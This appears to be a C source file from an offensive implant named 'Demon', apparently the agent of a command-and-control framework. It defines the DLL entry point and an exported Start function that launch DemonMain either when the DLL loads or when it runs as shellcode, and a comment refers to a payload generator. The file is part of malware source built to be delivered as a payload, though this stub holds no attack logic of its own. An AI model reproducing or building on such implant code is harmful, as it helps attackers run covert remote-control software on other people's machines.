#include <Demon.h>

HINSTANCE hAppInstance = NULL;

// We gotta export something lol. TODO: make this function name optional/changeable in the payload generator.
DLLEXPORT VOID Start(  )
{
    DemonMain( hAppInstance );
}

// this is our entrypoint for the Dll (also for shellcode)
BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
{
    if ( Reason == DLL_PROCESS_ATTACH )
    {
#ifdef SHELLCODE
        DemonMain( hDllBase );
        return TRUE;
#else
        hAppInstance = hDllBase;

    #ifdef DEBUG
        AllocConsole();
        freopen("CONOUT$", "w", stdout);
    #endif
#endif
    }

    return TRUE;
}